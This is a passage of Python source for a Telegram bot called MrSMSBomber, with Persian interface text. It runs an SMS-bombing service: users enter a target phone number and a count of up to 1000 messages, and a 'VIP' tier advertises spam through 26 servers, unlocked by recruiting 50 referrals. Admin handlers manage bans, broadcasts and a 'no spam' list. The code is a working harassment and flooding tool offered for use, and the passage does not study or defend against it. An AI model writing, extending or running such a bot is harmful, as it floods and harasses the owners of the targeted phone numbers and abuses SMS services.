            update.message.reply_text(f'{count} اس ام اس به شماره {phone}ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)

            return ConversationHandler.END

        else:
            update.message.reply_text('محدودیت ارسال پیامک در هر درخواست 1000 تا است.\nلطفا یک عدد بین 0 تا 1000 وارد کنید.')

    except:
        update.message.reply_text('لطفا یک عدد وارد کنید.')

vipTest_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^🤩تست بخش ویژه🤩$'), VipTest_Start)],
    states={
        vipTest_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), VipTest_GetTarget)],
        vipTest_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), VipTest_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)
###############################viptest##############################
##############################info#########################################
@run_async
def info(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
        update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
    else:
        sh_msg = ""
        for i in Users.find({'_id':int(update.message.chat_id)}):
            sh_msg += f"🔰آیدی: {i['Username']}\n"
            if not i['TestVip']: sh_msg += "🔰تست بخش ویژه: انجام نشده\n"
            elif i['TestVip']: sh_msg += "🔰تست بخش ویژه: انجام شده\n"
            sh_msg += f"🔰تعداد زیر مجموعه: {i['Subset']}\n"
            if not i['VipMode']: sh_msg += "🔰بخش ویژه: غیر فعال\n"
            elif i['VipMode']: sh_msg += "🔰بخش ویژه: فعال\n"
            sh_msg += f"تعداد اسپم های انجام شده: {len(i['Requests'])}"
            # sh_msg += f"لینک دعوت دیگران:\nhttps://t.me/MrSMSBomberBot?start={update.message.chat_id}"
        update.message.reply_text(sh_msg)
##############################info#########################################
def SubsetLink(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
        update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
    else:
        update.message.reply_text(f'''سلام به بخش زیر مجموعه گیری خوش آمدید🤗

شما میتوانید از طریق لینک منحصر به فرد خود 50 نفر را به ربات دعوت کنید و حساب خود را ویژه کنید.🤩😍

مزیت های بخش اسپم ویژه:
🔺اسپم با 26 سرور🔥
🔺سرعت بسیار بالا😱
🔺مادام العمر😎

لینک شما:
https://t.me/MrSMSBomberBot?start={update.message.chat_id}''')


dp = updater.dispatcher

dp.add_handler(CommandHandler('start', start))
dp.add_handler(MessageHandler(Filters.regex('^💣اسپم💣$'), Spam_Menu))
dp.add_handler(MessageHandler(Filters.regex('^دانلود دیتابیس$'), AdminPanel.GetDB))
dp.add_handler(MessageHandler(Filters.regex('^مشاهده لیست کاربران$'), AdminPanel.SeeUsers))
dp.add_handler(MessageHandler(Filters.regex('^📍زیرمجموعه گیری📍$'), SubsetLink))
dp.add_handler(free_conv)
dp.add_handler(vip_conv)
dp.add_handler(vipTest_conv)
dp.add_handler(AdminPanel.sendToAll_conv)
dp.add_handler(AdminPanel.BanSB_conv)
dp.add_handler(AdminPanel.UnBanSB_conv)
dp.add_handler(AdminPanel.UpToLicense_conv)
dp.add_handler(AdminPanel.DownToLicense_conv)
dp.add_handler(AdminPanel.sendToOne_conv)
dp.add_handler(AdminPanel.AddNoSpam_conv)
dp.add_handler(AdminPanel.RemNoSpam_conv)
dp.add_handler(MessageHandler(Filters.regex('^ورود به پنل مدیریت$'), Admin_Show))
dp.add_handler(MessageHandler(Filters.regex("^💳اطلاعات حساب💳$"), info))
dp.add_handler(MessageHandler(Filters.regex('^🤔راهنما🤔$'), help))
dp.add_handler(MessageHandler(Filters.regex('^برگشت$'), back))

updater.start_polling()
updater.idle()
